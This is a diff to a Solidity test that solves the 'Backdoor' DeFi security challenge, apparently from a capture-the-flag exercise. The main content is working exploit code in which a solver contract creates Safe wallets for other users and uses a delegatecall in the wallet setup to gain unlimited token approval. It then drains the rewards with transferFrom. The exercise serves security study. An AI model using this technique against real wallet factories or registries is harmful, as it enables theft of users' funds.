@@ -73,10 +73,12 @@ contract BackdoorChallenge is Test {
         // Steps to solve this challenge:
         // 1) Deploy ChallengeSolver contract as the one transaction by player
         // (All contract creations initiated by the player must be limited to one so the rest will be executed within the ChallengeSolver constructor)
-        // 2) Deploy helper contract
-        // 2) Deploy safe proxies for each user
-        // 3) Use delegate call from within each safe contract setup to grant ourselves infinite approval on the DVT contact
-        // 4) Use transferFrom to rescue token rewards from safe contracts and deposit into recovery address
+        // 2) Deploy helper contract from within ChallengeSolver constructor
+        // 3) Deploy safe proxies for each user
+        // 4) Use Safe’s setup function to delegatecall into our stateless helper contract, which then performs a normal call to token.approve() so the token’s allowance storage is properly updated
+        // This gives us infinite approval on the DVT contract for each safe proxy we deploy
+        // Delegatecall target must be a deployed contract to avoid revert: (GS002) from safe contract
+        // 5) Use transferFrom to rescue token rewards from safe contracts and deposit into recovery address
 
         // Deploy challenge solver contract to pack all necessary operations into 1 transaction that executes from the constructor
         new ChallengeSolver(token, singletonCopy, walletFactory, walletRegistry, recovery, users);
@@ -136,7 +138,7 @@ contract ChallengeSolver {
         recovery = _recovery;
         users = _users;
 
-        // deploy stateless helper contract to be delegate called during safe setup
+        // deploy stateless helper contract to be delegatecalled during safe setup
         Approver _approver = new Approver();
         approver = address(_approver);
 
@@ -175,16 +177,16 @@ contract ChallengeSolver {
 
     function _encodeSafeSetupCall(address[] memory owners)
         internal
-        pure
+        view
         returns (bytes memory initializerDataForSafeCreation)
     {
         // variables needed for initial Safe setup call
         uint256 threshold = 1; // Number of required confirmations for a Safe transaction.
 
-        // set "to" as our stateless helper contract to be delegate called within safe setup
-        address to = approver; // Contract address for optional delegate call.
+        // set "to" as our stateless helper contract to be delegatecalled within safe setup
+        address to = approver; // Contract address for optional delegatecall.
         // encode "approveMe" function call from our helper contract with the DVT token address and this contacts address as inputs
-        bytes memory data = abi.encodeWithSelector(Approver.approveMe.selector, address(token), address(this)); // Data payload for optional delegate call.
+        bytes memory data = abi.encodeWithSelector(Approver.approveMe.selector, address(token), address(this)); // Data payload for optional delegatecall.
 
         address fallbackHandler = address(0); // Handler for fallback calls to this contract
         address paymentToken = address(0); // Token that should be used for the payment (0 is ETH)
@@ -199,17 +201,31 @@ contract ChallengeSolver {
 }
 
 // This needs to be it's own contract
-// If it was just another function on ChallengeSolver, then when the safe tried to delegate call, the safe contract would revert because the extcodesize check would still think ChallengeSolver had no code until after it's constructor finished running
-// Safe.setup requires `to` to be a deployed contract `(isContract(to))`, so the delegate call target cannot be the ChallengeSolver during it's constructor
-// This contract also has to be fully stateless since it will be delegate called, meaning it will be using the storage of the safe proxy so any reads/writes to state variables would be incorrect
+// If it was just another function on ChallengeSolver, then when the safe tried to delegatecall, the safe contract would revert because the extcodesize check would still think ChallengeSolver had no code until after it's constructor finished running because isContract(to) checks extcodesize(to) > 0, which is false for a contract still in construction
+// Safe.setup requires `to` to be a deployed contract `(isContract(to))`, so the delegatecall target cannot be the ChallengeSolver during it's constructor
+// This contract also has to have no reliance on the helper’s storage, since delegatecall uses the Safe proxies’s storage context, meaning it will be using the storage of the safe proxy so any reads/writes to state variables would be useless
 contract Approver {
     error ApprovalFailed();
 
     function approveMe(address dvt, address addressToApprove) external {
-        (bool success,) =
+        // If this used IERC20(token).approve like normal, then it would revert automatically if the token returns false because it expects a bool return
+        // using a low level .call() like this bypasses that built in safety so we should check return data manually
+        (bool success, bytes memory ret) =
             dvt.call(abi.encodeWithSignature("approve(address,uint256)", addressToApprove, type(uint256).max));
+        // check basic transaction success
         if (!success) {
             revert ApprovalFailed();
         }
+        // check return data and ensure the DVT contract returned true, indicating the approval succeeded (not needed for challenge)
+        if (ret.length > 0) {
+            // ensures return data is not malformed (not needed for challenge && sometimes not desirable when integrating a wide variety of non-standard ERC20s)
+            if (ret.length != 32) revert ApprovalFailed();
+            // ensures return data contains expected boolean (not needed for challenge)
+            if (!abi.decode(ret, (bool))) revert ApprovalFailed();
+        }
+        // more succinct version of success and return data check above (without malformed data check):
+        // if (!success || (ret.length > 0 && !abi.decode(ret, (bool)))) {
+        //     revert ApprovalFailed();
+        // }
     }
 }
